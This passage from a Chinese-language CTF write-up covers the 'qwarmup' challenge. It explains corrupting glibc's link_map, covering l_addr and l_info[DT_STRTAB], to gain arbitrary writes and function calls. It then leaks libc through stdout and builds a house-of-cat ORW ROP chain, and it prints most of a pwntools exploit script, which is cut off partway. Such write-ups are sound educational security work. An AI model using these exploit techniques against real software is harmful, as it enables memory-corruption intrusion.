<span id="cb22-12"><a href="#cb22-12" aria-hidden="true"></a>    <span class="kw">def</span> <span class="fu">__init__</span>(<span class="va">self</span>, offset):</span>
<span id="cb22-13"><a href="#cb22-13" aria-hidden="true"></a>        <span class="va">self</span>.offset <span class="op">=</span> offset</span>
<span id="cb22-14"><a href="#cb22-14" aria-hidden="true"></a></span>
<span id="cb22-15"><a href="#cb22-15" aria-hidden="true"></a>    <span class="kw">def</span> l_addr(<span class="va">self</span>):</span>
<span id="cb22-16"><a href="#cb22-16" aria-hidden="true"></a>        <span class="cf">return</span> ld.address <span class="op">+</span> <span class="va">self</span>.offset</span>
<span id="cb22-17"><a href="#cb22-17" aria-hidden="true"></a></span>
<span id="cb22-18"><a href="#cb22-18" aria-hidden="true"></a>    <span class="kw">def</span> l_info(<span class="va">self</span>, tag):</span>
<span id="cb22-19"><a href="#cb22-19" aria-hidden="true"></a>        <span class="cf">return</span> ld.address <span class="op">+</span> <span class="va">self</span>.offset <span class="op">+</span> <span class="bn">0x40</span> <span class="op">+</span> tag <span class="op">*</span> <span class="dv">8</span></span>
<span id="cb22-20"><a href="#cb22-20" aria-hidden="true"></a></span>
<span id="cb22-21"><a href="#cb22-21" aria-hidden="true"></a>ld.address <span class="op">=</span> <span class="bn">0x32f000</span> <span class="op">-</span> <span class="bn">0x10</span>  <span class="co"># ld相对于malloc返回值的偏移</span></span>
<span id="cb22-22"><a href="#cb22-22" aria-hidden="true"></a>libc.address <span class="op">=</span> <span class="bn">0xf4000</span> <span class="op">-</span> <span class="bn">0x10</span> <span class="co"># libc相对于malloc返回值的偏移</span></span>
<span id="cb22-23"><a href="#cb22-23" aria-hidden="true"></a>binary_map <span class="op">=</span> link_map(<span class="bn">0x3b2e0</span>)<span class="co"># link_map相对于ld基地址的偏移</span></span>
<span id="cb22-24"><a href="#cb22-24" aria-hidden="true"></a></span>
<span id="cb22-25"><a href="#cb22-25" aria-hidden="true"></a>p.send(p32(<span class="bn">0xF0000</span>))  <span class="co"># malloc(0xF0000)</span></span>
<span id="cb22-26"><a href="#cb22-26" aria-hidden="true"></a></span>
<span id="cb22-27"><a href="#cb22-27" aria-hidden="true"></a><span class="co"># =============[ loop ]=========================</span></span>
<span id="cb22-28"><a href="#cb22-28" aria-hidden="true"></a><span class="co"># write_real_addr ==&gt; write@got + 0x70</span></span>
<span id="cb22-29"><a href="#cb22-29" aria-hidden="true"></a><span class="co"># set size=0xF0000 ==&gt; size = 0x0XXXX</span></span>
<span id="cb22-30"><a href="#cb22-30" aria-hidden="true"></a><span class="co"># Strat Loop</span></span>
<span id="cb22-31"><a href="#cb22-31" aria-hidden="true"></a><span class="co"># write@got != real_addr ==&gt; call write AWAYLS lazy Binding </span></span>
<span id="cb22-32"><a href="#cb22-32" aria-hidden="true"></a>logger(<span class="st">&quot;binary_map.l_addr()&quot;</span>,binary_map.l_addr())</span>
<span id="cb22-33"><a href="#cb22-33" aria-hidden="true"></a>write(binary_map.l_addr(),<span class="st">&quot;</span><span class="ch">\x70</span><span class="st">&quot;</span>)</span></code></pre></div>
<h3 id="任意函数调用">3. 任意函数调用</h3>
<p>实现了无限次任意地址写之后，我们就要考虑如何任意函数调用。</p>
<p>由于有了无限次任意写，我们就可以考虑对延迟绑定更多的利用。上文我们提到了，获取的函数真实地址计算方式是利用<strong>字符串表</strong>的函数字符串查找对应的<code>link_map</code>，之后调用并计算<code>st_value + l_addr</code>得到真实地址。</p>
<p>那么如果我们能控制<code>字符串表</code>的内容，不就相当于可以任意函数调用了吗，但是可惜的是<code>.dynstr</code>位于程序不可写区，我们没法修改<strong>字符串表</strong>的内容。但是程序<code>.dynstr</code>地址的方式是通过它对应的<code>d_tag</code>获得对应偏移的<code>d_ptr</code>。而<code>l_info[]</code>数据组中保存的就是各个<code>Elf64_Dyn</code>结构体的地址，而程序获得<code>.dynstr</code>地址的方式恰巧就是<code>l_info[DT_STRTAB]</code>获得对应的<code>Elf64_Dyn-&gt;d_ptr</code>，但是这个在<code>link_map</code>中的数据类似于<code>l_addr</code>同样是我们可以修改的。</p>
<p>也就是说<code>l_info[DT_STRTAB]</code>指向了<code>DT_STRTAB</code>对应的<code>Elf64_Dyn</code>。而如果我们可以修改<code>l_info[DT_STRTAB]</code>的低位也就是修改偏移，让其指向例如<code>DT_DEBUG</code>对应的<code>Elf64_Dyn</code>，那么原本的字符串表地址就会有从<code>l_info[DT_STRTAB]-&gt;d_ptr</code>变成了<code>l_info[DT_DEBUG]-&gt;d_ptr</code>。而<code>l_info[DT_DEBUG]-&gt;d_ptr</code>是指向<code>ld</code>中一块用于调试的区域，同样是我们可写的区域。</p>
<div class="sourceCode" id="cb23"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true"></a><span class="dt">const</span> <span class="dt">char</span> *strtab = (<span class="dt">const</span> <span class="dt">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span></code></pre></div>
<p>也就是说，修改<code>l_info[DT_STRTAB]</code>的低位使其指向<code>DT_DEBUG</code>从而就控制了<code>*strtab</code></p>
<p>正常<code>l_info[DT_STRTAB]</code>：</p>
<p><img src="https://pic.imgdb.cn/item/6375f31316f2c2beb1211f75.jpg" /></p>
<p>正常<code>l_info[DT_STRTAB]</code>指向对应的<code>DT_STRTAB</code>:</p>
<p><img src="https://pic.imgdb.cn/item/6375f34516f2c2beb1215f7b.jpg" /></p>
<p>修改指向<code>l_info[DT_DEBUG]</code>后，对应的<code>DT_DEBUG</code>：</p>
<p>(也就是覆盖低位为0xD8)</p>
<p><img src="https://pic.imgdb.cn/item/6378bf1716f2c2beb145808d.jpg" /></p>
<p>可以看到原来获取的字符串表地址应该是:<code>0x560190f44560</code>，现在会指向<code>0x7f7649259118</code>，也就是<code>ld</code>中的地址，我们的可控地址。</p>
<p>之后如果在<code>0x7f7649259118</code>写入字符串，控制字符串偏移和真实字符串表中<code>write</code>的偏移一致，就可以实现任意函数调用。</p>
<h3 id="泄露libc">4. 泄露libc</h3>
<p>虽然我们可以实现任意函数调用，但需要注意的是我们控制不了函数参数，或者说如果有参数的话只能是<code>write</code>函数的参数，所以我需要继续进一步考虑如何拿到<code>flag</code>。</p>
<p>这题调用了<code>puts</code>之类使用<code>IO_file</code>的函数，也就是说<code>_IO_2_1_stdout_</code>必然会保存缓冲区地址，那么就回到了我们的常规利用思路，修改修改<code>_IO_write_base</code>或者<code>_IO_write_ptr</code>的低字节使得<code>_IO_write_base != _IO_write_ptr</code>，刷新缓冲区泄露<code>libc</code>。</p>
<p>通过修改<code>_IO_2_1_stdout_</code>结构体然后手动调用无参数的<code>_IO_flush_all</code>刷新IO流来泄露libc。</p>
<p>具体来说就是修改<code>_IO_write_base</code>或者<code>_IO_write_ptr</code>然后调用<code>_IO_flush_all</code>即可。</p>
<div class="sourceCode" id="cb24"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true"></a><span class="co"># =============[ edit stdout ]==================</span></span>
<span id="cb24-2"><a href="#cb24-2" aria-hidden="true"></a>write(libc.symbols[<span class="st">&#39;_IO_2_1_stdout_&#39;</span>],p32(<span class="bn">0xfbad1800</span>))</span>
<span id="cb24-3"><a href="#cb24-3" aria-hidden="true"></a>write(libc.symbols[<span class="st">&#39;_IO_2_1_stdout_&#39;</span>]<span class="op">+</span><span class="bn">0x28</span>,p8(<span class="bn">0xff</span>))</span>
<span id="cb24-4"><a href="#cb24-4" aria-hidden="true"></a></span>
<span id="cb24-5"><a href="#cb24-5" aria-hidden="true"></a><span class="co"># ====[r_dubug.write ==&gt; &quot;_IO_flush_all&quot;]=======</span></span>
<span id="cb24-6"><a href="#cb24-6" aria-hidden="true"></a>write(ld.symbols[<span class="st">&#39;_r_debug&#39;</span>]<span class="op">+</span><span class="bn">0x22</span>,<span class="st">&quot;_IO_flush_all</span><span class="ch">\x00</span><span class="st">&quot;</span>)     <span class="co"># 伪造wirte函数对应字符串表项：_IO_flush_all</span></span>
<span id="cb24-7"><a href="#cb24-7" aria-hidden="true"></a></span>
<span id="cb24-8"><a href="#cb24-8" aria-hidden="true"></a><span class="co"># =============[.strtab ==&gt; r_dubug]============</span></span>
<span id="cb24-9"><a href="#cb24-9" aria-hidden="true"></a><span class="co"># =============[call _IO_flush_all]==============</span></span>
<span id="cb24-10"><a href="#cb24-10" aria-hidden="true"></a>logger(<span class="st">&quot;binary_map.l_info(DT_STRTAB)&quot;</span>,binary_map.l_info(binary_map.DT_STRTAB))</span>
<span id="cb24-11"><a href="#cb24-11" aria-hidden="true"></a>write_nosuccess(binary_map.l_info(binary_map.DT_STRTAB),<span class="st">&quot;</span><span class="ch">\xb8</span><span class="st">&quot;</span>)   <span class="co"># 修改strtab指向_r_debug</span></span>
<span id="cb24-12"><a href="#cb24-12" aria-hidden="true"></a><span class="co"># call _IO_flush_all</span></span>
<span id="cb24-13"><a href="#cb24-13" aria-hidden="true"></a><span class="co"># leak libc</span></span>
<span id="cb24-14"><a href="#cb24-14" aria-hidden="true"></a>p.recv(<span class="dv">5</span>)</span>
<span id="cb24-15"><a href="#cb24-15" aria-hidden="true"></a>libc_base <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,b<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">-</span><span class="bn">0x21ba70</span></span>
<span id="cb24-16"><a href="#cb24-16" aria-hidden="true"></a>logger(<span class="st">&quot;libc_base&quot;</span>,libc_base)</span></code></pre></div>
<h3 id="执行rop">5. 执行ROP</h3>
<p>获得libc地址之后打法就很随意了，这里使用<code>house of cat</code>:</p>
<div class="sourceCode" id="cb25"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true"></a><span class="co"># ================[fix write]===================</span></span>
<span id="cb25-2"><a href="#cb25-2" aria-hidden="true"></a>write(binary_map.l_info(binary_map.DT_STRTAB),<span class="st">&quot;</span><span class="ch">\x78</span><span class="st">&quot;</span>)</span>
<span id="cb25-3"><a href="#cb25-3" aria-hidden="true"></a></span>
<span id="cb25-4"><a href="#cb25-4" aria-hidden="true"></a></span>
<span id="cb25-5"><a href="#cb25-5" aria-hidden="true"></a><span class="co"># ===============[house of cat]=================</span></span>
<span id="cb25-6"><a href="#cb25-6" aria-hidden="true"></a>setcontext <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x53a30</span><span class="op">+</span><span class="dv">61</span></span>
<span id="cb25-7"><a href="#cb25-7" aria-hidden="true"></a>syscall <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x0000000000091396</span></span>
<span id="cb25-8"><a href="#cb25-8" aria-hidden="true"></a>pop_rax <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x0000000000045eb0</span></span>
<span id="cb25-9"><a href="#cb25-9" aria-hidden="true"></a>pop_rdi <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x000000000002a3e5</span></span>
<span id="cb25-10"><a href="#cb25-10" aria-hidden="true"></a>pop_rsi <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x000000000002be51</span></span>
<span id="cb25-11"><a href="#cb25-11" aria-hidden="true"></a>pop_rdx_rbx <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x0000000000090529</span></span>
<span id="cb25-12"><a href="#cb25-12" aria-hidden="true"></a>_IO_wfile_jumps <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x2160c0</span></span>
<span id="cb25-13"><a href="#cb25-13" aria-hidden="true"></a>heap <span class="op">=</span> libc_base<span class="op">-</span><span class="bn">0xf3ff0</span></span>
<span id="cb25-14"><a href="#cb25-14" aria-hidden="true"></a>stderr <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x21a6a0</span></span>
<span id="cb25-15"><a href="#cb25-15" aria-hidden="true"></a></span>
<span id="cb25-16"><a href="#cb25-16" aria-hidden="true"></a>write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0x28</span>,p64(<span class="bn">0xffffffffffffffff</span>))</span>
<span id="cb25-17"><a href="#cb25-17" aria-hidden="true"></a>write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0x40</span>,p64(<span class="dv">1</span>))</span>
<span id="cb25-18"><a href="#cb25-18" aria-hidden="true"></a>write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0x50</span>,p64(heap)<span class="op">+</span>p64(setcontext))<span class="co"># rdx</span></span>
<span id="cb25-19"><a href="#cb25-19" aria-hidden="true"></a>write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0xa0</span>,p64(stderr<span class="op">+</span><span class="bn">0x30</span>))</span>
<span id="cb25-20"><a href="#cb25-20" aria-hidden="true"></a>write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0xd8</span>,p64(_IO_wfile_jumps<span class="op">+</span><span class="bn">0x30</span>))</span>
<span id="cb25-21"><a href="#cb25-21" aria-hidden="true"></a>write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0xd8</span><span class="op">+</span><span class="bn">0x38</span>,p64(stderr<span class="op">+</span><span class="bn">0x40</span>))</span>
<span id="cb25-22"><a href="#cb25-22" aria-hidden="true"></a></span>
<span id="cb25-23"><a href="#cb25-23" aria-hidden="true"></a>rop <span class="op">=</span> p64(heap)<span class="op">+</span>p64(pop_rsi)<span class="op">+</span>p64(<span class="dv">0</span>)<span class="op">+</span>p64(pop_rax)<span class="op">+</span>p64(<span class="dv">2</span>)<span class="op">+</span>p64(syscall)</span>
<span id="cb25-24"><a href="#cb25-24" aria-hidden="true"></a>rop <span class="op">+=</span> p64(pop_rdi)<span class="op">+</span>p64(<span class="dv">3</span>)<span class="op">+</span>p64(pop_rsi)<span class="op">+</span>p64(heap<span class="op">+</span><span class="bn">0x400</span>)<span class="op">+</span>p64(pop_rdx_rbx)<span class="op">+</span>p64(<span class="bn">0x30</span>)<span class="op">*</span><span class="dv">2</span><span class="op">+</span>p64(pop_rax)<span class="op">+</span>p64(<span class="dv">0</span>)<span class="op">+</span>p64(syscall)</span>
<span id="cb25-25"><a href="#cb25-25" aria-hidden="true"></a>rop <span class="op">+=</span> p64(pop_rdi)<span class="op">+</span>p64(<span class="dv">1</span>)<span class="op">+</span>p64(pop_rax)<span class="op">+</span>p64(<span class="dv">1</span>)<span class="op">+</span>p64(syscall)</span>
<span id="cb25-26"><a href="#cb25-26" aria-hidden="true"></a></span>
<span id="cb25-27"><a href="#cb25-27" aria-hidden="true"></a>payload <span class="op">=</span> b<span class="st">&quot;flag&quot;</span>.ljust(<span class="bn">0xa0</span>,b<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)<span class="op">+</span>p64(heap<span class="op">+</span><span class="bn">0x100</span>)<span class="op">+</span>p64(pop_rdi)</span>
<span id="cb25-28"><a href="#cb25-28" aria-hidden="true"></a>payload <span class="op">=</span> payload.ljust(<span class="bn">0x100</span>,b<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)</span>
<span id="cb25-29"><a href="#cb25-29" aria-hidden="true"></a>payload <span class="op">+=</span> rop</span>
<span id="cb25-30"><a href="#cb25-30" aria-hidden="true"></a>write(<span class="dv">0</span>,payload)</span>
<span id="cb25-31"><a href="#cb25-31" aria-hidden="true"></a></span>
<span id="cb25-32"><a href="#cb25-32" aria-hidden="true"></a><span class="co"># debug(p,&quot;b *{}&quot;.format(setcontext))</span></span>
<span id="cb25-33"><a href="#cb25-33" aria-hidden="true"></a><span class="co"># pause()</span></span>
<span id="cb25-34"><a href="#cb25-34" aria-hidden="true"></a></span>
<span id="cb25-35"><a href="#cb25-35" aria-hidden="true"></a><span class="co"># =============[call _IO_flush_all]==============</span></span>
<span id="cb25-36"><a href="#cb25-36" aria-hidden="true"></a>write_nosuccess(binary_map.l_info(binary_map.DT_STRTAB),<span class="st">&quot;</span><span class="ch">\xb8</span><span class="st">&quot;</span>)</span></code></pre></div>
<p>ORW读flag。</p>
<h3 id="完整exp">6. 完整exp</h3>
<div class="sourceCode" id="cb26"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true"></a><span class="co"># -*- coding: utf-8 -*-</span></span>
<span id="cb26-2"><a href="#cb26-2" aria-hidden="true"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
<span id="cb26-3"><a href="#cb26-3" aria-hidden="true"></a>context(os<span class="op">=</span><span class="st">&#39;linux&#39;</span>,arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</span>
<span id="cb26-4"><a href="#cb26-4" aria-hidden="true"></a>context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></span>
<span id="cb26-5"><a href="#cb26-5" aria-hidden="true"></a>libc <span class="op">=</span> ELF(<span class="st">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)</span>
<span id="cb26-6"><a href="#cb26-6" aria-hidden="true"></a>ld <span class="op">=</span> ELF(<span class="st">&#39;/lib64/ld-linux-x86-64.so.2&#39;</span>)</span>
<span id="cb26-7"><a href="#cb26-7" aria-hidden="true"></a>elf <span class="op">=</span> ELF(<span class="st">&quot;./qwarmup&quot;</span>)</span>
<span id="cb26-8"><a href="#cb26-8" aria-hidden="true"></a></span>
<span id="cb26-9"><a href="#cb26-9" aria-hidden="true"></a>local <span class="op">=</span> <span class="dv">1</span></span>
<span id="cb26-10"><a href="#cb26-10" aria-hidden="true"></a></span>
<span id="cb26-11"><a href="#cb26-11" aria-hidden="true"></a><span class="cf">if</span> local:</span>
<span id="cb26-12"><a href="#cb26-12" aria-hidden="true"></a>    p <span class="op">=</span> process(<span class="st">&quot;./qwarmup&quot;</span>)    </span>
<span id="cb26-13"><a href="#cb26-13" aria-hidden="true"></a><span class="cf">else</span>:</span>
<span id="cb26-14"><a href="#cb26-14" aria-hidden="true"></a>    p <span class="op">=</span> remote(<span class="st">&quot;&quot;</span>,<span class="st">&quot;&quot;</span>)</span>
<span id="cb26-15"><a href="#cb26-15" aria-hidden="true"></a></span>
<span id="cb26-16"><a href="#cb26-16" aria-hidden="true"></a><span class="kw">def</span> debug(p,cmd<span class="op">=</span><span class="st">&quot;&quot;</span>):</span>
<span id="cb26-17"><a href="#cb26-17" aria-hidden="true"></a>    <span class="cf">if</span> local:</span>
<span id="cb26-18"><a href="#cb26-18" aria-hidden="true"></a>        gdb.attach(p,cmd)</span>
<span id="cb26-19"><a href="#cb26-19" aria-hidden="true"></a>    <span class="cf">else</span>:</span>
<span id="cb26-20"><a href="#cb26-20" aria-hidden="true"></a>        <span class="cf">pass</span></span>
<span id="cb26-21"><a href="#cb26-21" aria-hidden="true"></a></span>
<span id="cb26-22"><a href="#cb26-22" aria-hidden="true"></a><span class="kw">def</span> logger(msg,addr):</span>
<span id="cb26-23"><a href="#cb26-23" aria-hidden="true"></a>    log.success(msg<span class="op">+</span><span class="st">&quot; ==&gt;&quot;</span><span class="op">+</span><span class="bu">hex</span>(addr))</span>
<span id="cb26-24"><a href="#cb26-24" aria-hidden="true"></a></span>
<span id="cb26-25"><a href="#cb26-25" aria-hidden="true"></a><span class="kw">def</span> write(offset, data):</span>
<span id="cb26-26"><a href="#cb26-26" aria-hidden="true"></a>    <span class="cf">for</span> i, byte <span class="kw">in</span> <span class="bu">enumerate</span>(data):</span>
<span id="cb26-27"><a href="#cb26-27" aria-hidden="true"></a>        p.send(p64(offset <span class="op">+</span> i, signed<span class="op">=</span><span class="va">True</span>))</span>
<span id="cb26-28"><a href="#cb26-28" aria-hidden="true"></a>        <span class="cf">if</span>(<span class="bu">type</span>(byte) <span class="op">==</span> <span class="bu">type</span>(<span class="bn">0x1</span>)):</span>
<span id="cb26-29"><a href="#cb26-29" aria-hidden="true"></a>            p.send(p8(byte))</span>
<span id="cb26-30"><a href="#cb26-30" aria-hidden="true"></a>        <span class="cf">else</span>:</span>
<span id="cb26-31"><a href="#cb26-31" aria-hidden="true"></a>            p.send(byte)</span>
<span id="cb26-32"><a href="#cb26-32" aria-hidden="true"></a>        p.recvuntil(<span class="st">&quot;Success!&quot;</span>)</span>
<span id="cb26-33"><a href="#cb26-33" aria-hidden="true"></a></span>
<span id="cb26-34"><a href="#cb26-34" aria-hidden="true"></a><span class="kw">def</span> write_nosuccess(offset, data):</span>
<span id="cb26-35"><a href="#cb26-35" aria-hidden="true"></a>    <span class="cf">for</span> i, byte <span class="kw">in</span> <span class="bu">enumerate</span>(data):</span>
<span id="cb26-36"><a href="#cb26-36" aria-hidden="true"></a>        p.send(p64(offset <span class="op">+</span> i, signed<span class="op">=</span><span class="va">True</span>))</span>
<span id="cb26-37"><a href="#cb26-37" aria-hidden="true"></a>        <span class="cf">if</span>(<span class="bu">type</span>(byte) <span class="op">==</span> <span class="bu">type</span>(<span class="bn">0x1</span>)):</span>
<span id="cb26-38"><a href="#cb26-38" aria-hidden="true"></a>            p.send(p8(byte))</span>
<span id="cb26-39"><a href="#cb26-39" aria-hidden="true"></a>        <span class="cf">else</span>:</span>
<span id="cb26-40"><a href="#cb26-40" aria-hidden="true"></a>            p.send(byte)</span>
<span id="cb26-41"><a href="#cb26-41" aria-hidden="true"></a></span>
<span id="cb26-42"><a href="#cb26-42" aria-hidden="true"></a><span class="kw">class</span> link_map:</span>
<span id="cb26-43"><a href="#cb26-43" aria-hidden="true"></a>    DT_JMPREL <span class="op">=</span> <span class="dv">23</span></span>
<span id="cb26-44"><a href="#cb26-44" aria-hidden="true"></a>    DT_SYMTAB <span class="op">=</span> <span class="dv">6</span></span>
<span id="cb26-45"><a href="#cb26-45" aria-hidden="true"></a>    DT_STRTAB <span class="op">=</span> <span class="dv">5</span></span>
<span id="cb26-46"><a href="#cb26-46" aria-hidden="true"></a>    DT_VER <span class="op">=</span> <span class="dv">50</span></span>
<span id="cb26-47"><a href="#cb26-47" aria-hidden="true"></a>    DT_FINI <span class="op">=</span> <span class="dv">13</span></span>
<span id="cb26-48"><a href="#cb26-48" aria-hidden="true"></a>    DT_PLTGOT <span class="op">=</span> <span class="dv">3</span></span>
<span id="cb26-49"><a href="#cb26-49" aria-hidden="true"></a>    DT_FINI_ARRAY <span class="op">=</span> <span class="dv">26</span></span>
<span id="cb26-50"><a href="#cb26-50" aria-hidden="true"></a>    DT_FINI_ARRAYSZ <span class="op">=</span> <span class="dv">28</span></span>
<span id="cb26-51"><a href="#cb26-51" aria-hidden="true"></a>    DT_DEBUG <span class="op">=</span> <span class="dv">21</span></span>
<span id="cb26-52"><a href="#cb26-52" aria-hidden="true"></a></span>
<span id="cb26-53"><a href="#cb26-53" aria-hidden="true"></a>    <span class="kw">def</span> <span class="fu">__init__</span>(<span class="va">self</span>, offset):</span>
<span id="cb26-54"><a href="#cb26-54" aria-hidden="true"></a>        <span class="va">self</span>.offset <span class="op">=</span> offset</span>
<span id="cb26-55"><a href="#cb26-55" aria-hidden="true"></a></span>
<span id="cb26-56"><a href="#cb26-56" aria-hidden="true"></a>    <span class="kw">def</span> l_addr(<span class="va">self</span>):</span>
<span id="cb26-57"><a href="#cb26-57" aria-hidden="true"></a>        <span class="cf">return</span> ld.address <span class="op">+</span> <span class="va">self</span>.offset</span>
<span id="cb26-58"><a href="#cb26-58" aria-hidden="true"></a></span>
<span id="cb26-59"><a href="#cb26-59" aria-hidden="true"></a>    <span class="kw">def</span> l_info(<span class="va">self</span>, tag):</span>
<span id="cb26-60"><a href="#cb26-60" aria-hidden="true"></a>        <span class="cf">return</span> ld.address <span class="op">+</span> <span class="va">self</span>.offset <span class="op">+</span> <span class="bn">0x40</span> <span class="op">+</span> tag <span class="op">*</span> <span class="dv">8</span></span>
<span id="cb26-61"><a href="#cb26-61" aria-hidden="true"></a></span>
<span id="cb26-62"><a href="#cb26-62" aria-hidden="true"></a>ld.address <span class="op">=</span> <span class="bn">0x32f000</span> <span class="op">-</span> <span class="bn">0x10</span></span>
<span id="cb26-63"><a href="#cb26-63" aria-hidden="true"></a>libc.address <span class="op">=</span> <span class="bn">0xf4000</span> <span class="op">-</span> <span class="bn">0x10</span></span>
<span id="cb26-64"><a href="#cb26-64" aria-hidden="true"></a>binary_map <span class="op">=</span> link_map(<span class="bn">0x3b2e0</span>)</span>
<span id="cb26-65"><a href="#cb26-65" aria-hidden="true"></a></span>
<span id="cb26-66"><a href="#cb26-66" aria-hidden="true"></a><span class="co"># debug(p,&quot;b *$rebase({})&quot;.format(0x14D1))</span></span>
<span id="cb26-67"><a href="#cb26-67" aria-hidden="true"></a><span class="co"># debug(p,&quot;b write&quot;)</span></span>
<span id="cb26-68"><a href="#cb26-68" aria-hidden="true"></a>p.send(p32(<span class="bn">0xF0000</span>))</span>
<span id="cb26-69"><a href="#cb26-69" aria-hidden="true"></a></span>
<span id="cb26-70"><a href="#cb26-70" aria-hidden="true"></a><span class="co"># =============[ loop ]=========================</span></span>
<span id="cb26-71"><a href="#cb26-71" aria-hidden="true"></a><span class="co"># write_real_addr ==&gt; write@got + 0x70</span></span>
<span id="cb26-72"><a href="#cb26-72" aria-hidden="true"></a><span class="co"># set size=0xF0000 ==&gt; size = 0x0XXXX</span></span>
<span id="cb26-73"><a href="#cb26-73" aria-hidden="true"></a><span class="co"># Strat Loop</span></span>
<span id="cb26-74"><a href="#cb26-74" aria-hidden="true"></a><span class="co"># write@got != real_addr ==&gt; call write AWAYLS lazy Binding </span></span>
<span id="cb26-75"><a href="#cb26-75" aria-hidden="true"></a>logger(<span class="st">&quot;binary_map.l_addr()&quot;</span>,binary_map.l_addr())</span>
<span id="cb26-76"><a href="#cb26-76" aria-hidden="true"></a>write(binary_map.l_addr(),<span class="st">&quot;</span><span class="ch">\x70</span><span class="st">&quot;</span>)</span>
<span id="cb26-77"><a href="#cb26-77" aria-hidden="true"></a></span>
<span id="cb26-78"><a href="#cb26-78" aria-hidden="true"></a><span class="co"># =============[ edit stdout ]==================</span></span>
<span id="cb26-79"><a href="#cb26-79" aria-hidden="true"></a>write(libc.symbols[<span class="st">&#39;_IO_2_1_stdout_&#39;</span>],p32(<span class="bn">0xfbad1800</span>))</span>
<span id="cb26-80"><a href="#cb26-80" aria-hidden="true"></a>write(libc.symbols[<span class="st">&#39;_IO_2_1_stdout_&#39;</span>]<span class="op">+</span><span class="bn">0x28</span>,p8(<span class="bn">0xff</span>))</span>
<span id="cb26-81"><a href="#cb26-81" aria-hidden="true"></a></span>
<span id="cb26-82"><a href="#cb26-82" aria-hidden="true"></a><span class="co"># ====[r_dubug.write ==&gt; &quot;_IO_flush_all&quot;]=======</span></span>
<span id="cb26-83"><a href="#cb26-83" aria-hidden="true"></a>write(ld.symbols[<span class="st">&#39;_r_debug&#39;</span>]<span class="op">+</span><span class="bn">0x22</span>,<span class="st">&quot;_IO_flush_all</span><span class="ch">\x00</span><span class="st">&quot;</span>)</span>
<span id="cb26-84"><a href="#cb26-84" aria-hidden="true"></a></span>
<span id="cb26-85"><a href="#cb26-85" aria-hidden="true"></a><span class="co"># =============[.strtab ==&gt; r_dubug]============</span></span>
<span id="cb26-86"><a href="#cb26-86" aria-hidden="true"></a><span class="co"># =============[call _IO_flush_all]=============</span></span>
<span id="cb26-87"><a href="#cb26-87" aria-hidden="true"></a>logger(<span class="st">&quot;binary_map.l_info(DT_STRTAB)&quot;</span>,binary_map.l_info(binary_map.DT_STRTAB))</span>
<span id="cb26-88"><a href="#cb26-88" aria-hidden="true"></a>write_nosuccess(binary_map.l_info(binary_map.DT_STRTAB),<span class="st">&quot;</span><span class="ch">\xb8</span><span class="st">&quot;</span>)</span>
<span id="cb26-89"><a href="#cb26-89" aria-hidden="true"></a><span class="co"># call _IO_flush_all</span></span>
<span id="cb26-90"><a href="#cb26-90" aria-hidden="true"></a><span class="co"># leak libc</span></span>
<span id="cb26-91"><a href="#cb26-91" aria-hidden="true"></a>p.recv(<span class="dv">5</span>)</span>
<span id="cb26-92"><a href="#cb26-92" aria-hidden="true"></a>libc_base <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,b<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">-</span><span class="bn">0x21ba70</span></span>
<span id="cb26-93"><a href="#cb26-93" aria-hidden="true"></a>logger(<span class="st">&quot;libc_base&quot;</span>,libc_base)</span>
<span id="cb26-94"><a href="#cb26-94" aria-hidden="true"></a></span>
<span id="cb26-95"><a href="#cb26-95" aria-hidden="true"></a><span class="co"># ================[fix write]===================</span></span>
<span id="cb26-96"><a href="#cb26-96" aria-hidden="true"></a>write(binary_map.l_info(binary_map.DT_STRTAB),<span class="st">&quot;</span><span class="ch">\x78</span><span class="st">&quot;</span>)</span>
<span id="cb26-97"><a href="#cb26-97" aria-hidden="true"></a></span>
<span id="cb26-98"><a href="#cb26-98" aria-hidden="true"></a></span>
<span id="cb26-99"><a href="#cb26-99" aria-hidden="true"></a><span class="co"># ===============[house of cat]=================</span></span>
<span id="cb26-100"><a href="#cb26-100" aria-hidden="true"></a>setcontext <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x53a30</span><span class="op">+</span><span class="dv">61</span></span>
<span id="cb26-101"><a href="#cb26-101" aria-hidden="true"></a>syscall <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x0000000000091396</span></span>
<span id="cb26-102"><a href="#cb26-102" aria-hidden="true"></a>pop_rax <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x0000000000045eb0</span></span>
